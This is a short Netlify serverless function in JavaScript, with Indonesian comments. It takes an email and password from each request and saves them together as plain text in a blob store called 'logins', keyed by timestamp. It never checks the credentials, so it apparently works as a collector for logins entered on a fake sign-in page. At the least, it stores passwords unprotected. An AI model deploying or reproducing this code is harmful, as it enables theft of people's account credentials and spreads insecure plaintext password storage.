// netlify/functions/save.js
import { blobs } from '@netlify/blobs';

export default async (request) => {
  try {
    const { email, password } = await request.json();

    // buat / akses store bernama "logins"
    const store = blobs.store("logins");

    const timestamp = Date.now();

    // key unik per login
    const key = `login-${timestamp}`;

    const value = `${email} | ${password}`;

    // simpan value ke blobs
    await store.set(key, value);

    return new Response(JSON.stringify({ success: true }), {
      status: 200,
      headers: { "Content-Type": "application/json" }
    });

  } catch (error) {
    return new Response(JSON.stringify({ error: error.message }), {
      status: 500,
      headers: { "Content-Type": "application/json" }
    });
  }
};
